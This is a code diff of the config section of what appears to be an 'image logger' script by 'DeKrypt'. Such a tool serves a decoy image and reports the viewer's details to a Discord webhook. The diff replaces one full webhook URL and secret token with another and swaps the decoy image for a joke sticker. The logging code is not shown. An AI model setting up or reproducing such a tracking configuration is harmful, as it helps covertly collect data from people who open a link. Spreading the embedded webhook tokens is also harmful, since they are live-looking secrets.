@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1372347321441980516/iXYdll_QqkiE6evZ6DylBLyAll8errSK2GCf9LHRvPtRex6qIKkBFJ7x6XMyIjiQX6V3",
+    "image": "https://image.spreadshirtmedia.net/image-server/v1/products/T1459A839PA4459PT28D338720863W10000H9336/views/1,width=550,height=550,appearanceId=839,backgroundColor=F2F2F2/stinky-phew-you-stink-gift-sticker.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
